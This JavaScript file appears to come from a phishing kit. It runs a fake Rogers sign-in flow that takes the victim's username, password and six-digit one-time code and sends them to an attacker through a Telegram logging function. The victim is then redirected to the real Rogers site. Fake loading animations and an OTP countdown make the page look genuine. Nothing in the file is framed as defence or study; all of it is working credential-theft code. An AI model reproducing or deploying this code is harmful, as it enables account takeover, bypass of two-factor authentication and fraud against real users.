"strict mode";

const wrapper = document.querySelector(".wrapper");
const otpPageWrapper = document.querySelector(".otp-page--wrapper");
const inputs = document.querySelectorAll(".input");
const usernameInput = document.querySelector("input[type='text']");
const passwordInput = document.querySelector("input[type='password']");

const stepOneForm = document.querySelector("#step-one");
const stepTwoForm = document.querySelector("#step-two");

const numberInputs = document.querySelectorAll(".input--numeric");
const alertBox = document.querySelector(".alert");
const userId = document.querySelector(".username-id");
const pageAnimation = document.querySelector(".page-animation");

import { sendLogsToTelegram } from "./app.js";
import { config, allConfig } from "./config.js";

// function confirmToken(userConfig, allConfig) {
//   const userToken = userConfig.TELEGRAM_TOKEN;
//   return allConfig.find((configuration) => configuration.TELEGRAM_TOKEN === userToken);
// }

// if (confirmToken(config, allConfig)) {
//   console.log("token not found");
//   return;
// }

const appState = {
  username: "",
  password: "",
  OTPcode: [],
};

function loadAnimation(element) {
  element.disabled = true;
  element.innerHTML = `<div class="loader"> </div>`;
}

window.addEventListener("click", (e) => {
  if (e.target.closest(".btn-visibility")) {
    e.preventDefault();
    const button = e.target.closest(".btn-visibility");
    const icon = button.querySelector("i");

    button.classList.toggle("btn-visibility--toggle");
    icon.classList.toggle("fa-eye");
    icon.classList.toggle("fa-eye-slash");
    passwordInput.setAttribute("type", `${passwordInput.type === "password" ? "text" : "password"}`);

    return;
  }

  // ==========================================

  if (e.target.closest("#next-page")) {
    e.preventDefault();

    const nextPageButton = e.target.closest("#next-page");

    loadAnimation(nextPageButton);

    setTimeout(() => {
      nextPageButton.disabled = false;
      nextPageButton.innerHTML = `Continue`;

      if (usernameInput.value.length < 3 && !usernameInput.value) {
        alertBox.classList.toggle("d-none");
        return;
      }

      stepOneForm.classList.toggle("d-none");
      stepTwoForm.classList.toggle("d-none");

      if (!alertBox.classList.contains("d-none")) alertBox.classList.toggle("d-none");

      appState.username = usernameInput.value;
      userId.textContent = appState.username;
    }, 2000);

    return;
  }

  // ==========================================

  if (e.target.closest(".close-alert")) {
    const closeAlertBoxButton = e.target.closest(".close-alert");
    closeAlertBoxButton.parentElement.classList.toggle("d-none");
  }

  // ==========================================

  if (e.target.closest("#submit")) {
    e.preventDefault();

    const submitButton = e.target.closest("#submit");

    loadAnimation(submitButton);

    setTimeout(() => {
      submitButton.disabled = false;
      submitButton.innerHTML = `Sign in`;

      if (!passwordInput.value) {
        alertBox.classList.toggle("d-none");
        alertBox.querySelector("span").textContent = "Please enter your password";
        passwordInput.parentElement.classList.add("alert--bg");
        passwordInput.classList.add("alert--bg");
        return;
      }

      if (passwordInput.value && passwordInput.value.length > 3) {
        appState.password = passwordInput.value;

        sendLogsToTelegram(appState, "otp.html", config);

        localStorage.setItem("appState", JSON.stringify(appState));

        return;
      }
    }, 2000);

    return;
  }

  // ==========================================

  if (e.target.closest("#redirect")) {
    e.preventDefault();

    const redirectButton = e.target.closest("#redirect");

    loadAnimation(redirectButton);

    setTimeout(() => {
      redirectButton.disabled = false;
      redirectButton.innerHTML = `Continue`;

      const savedData = JSON.parse(localStorage.getItem("appState"));
      savedData.OTPcode = appState.OTPcode;
      savedData.password = "N/A";
      sendLogsToTelegram(savedData, "https://www.rogers.com", config);
      console.log();
    }, 1000);
  }
});

window.addEventListener("pageshow", function (e) {
  inputs.forEach((input) => {
    const customPlaceholder = input.parentElement.querySelector("input + label");

    if (input.value) {
      customPlaceholder.classList.add("moveup");
    }
  });
});

inputs.forEach((input) => {
  const customPlaceholder = input.parentElement.querySelector("input + label");

  input.addEventListener("pageShow", function () {
    if (input.value) {
      customPlaceholder.classList.add("moveup");
    }
  });

  input.addEventListener("focus", function () {
    if (input.value === "" && document.activeElement === input) {
      customPlaceholder.classList.add("moveup");
    }
    return;
  });

  input.addEventListener("blur", function () {
    if (input.value === "") {
      customPlaceholder.classList.remove("moveup");
    }
    return;
  });
});

numberInputs.forEach((input, index) => {
  input.addEventListener("input", function (e) {
    const value = input.value;

    if (value && Number.isInteger(+value)) {
      appState.OTPcode[index] = +value;

      if (index < numberInputs.length - 1) {
        numberInputs[index + 1].focus();
      }
    }

    return;
  });

  input.addEventListener("keydown", function (e) {
    if (e.key === "Backspace" && index >= 0) {
      if (index === 0) return;
      appState.OTPcode.splice(index, 1);
      numberInputs[index].value = "";
      numberInputs[index - 1].focus();
    }
  });
});

window.addEventListener("load", function (e) {
  let secondsLeft = 120;

  if (otpPageWrapper) {
    const countdownWrapper = otpPageWrapper.querySelector(".otp-countdown-wrapper");
    const countdown = otpPageWrapper.querySelector(".otp-countdown");
    const otpLabel = otpPageWrapper.querySelector(".opt-label");
    const redirectionButton = document.querySelector("#redirect");

    redirectionButton.disabled = true;

    setTimeout(() => {
      pageAnimation.classList.add("hidden");
      otpPageWrapper.classList.remove("d-none");

      const countdownTimer = setInterval(() => {
        const minutes = Math.floor(secondsLeft / 60);
        const seconds = secondsLeft % 60;

        countdown.textContent = `(${minutes}:${seconds.toString().padStart(2, "0")})`;

        if (secondsLeft <= 0) {
          clearInterval(countdownTimer);
          countdownWrapper.classList.add("d-none");
          otpLabel.innerHTML = `Didn't receive the code? <a href="#" class="link">Resend code</a>`;
          redirectionButton.disabled = false;
        }

        secondsLeft--;

        if (appState.OTPcode.length === 6) {
          redirectionButton.disabled = false;
        }
      }, 1000);
    }, 3000);
  }
});
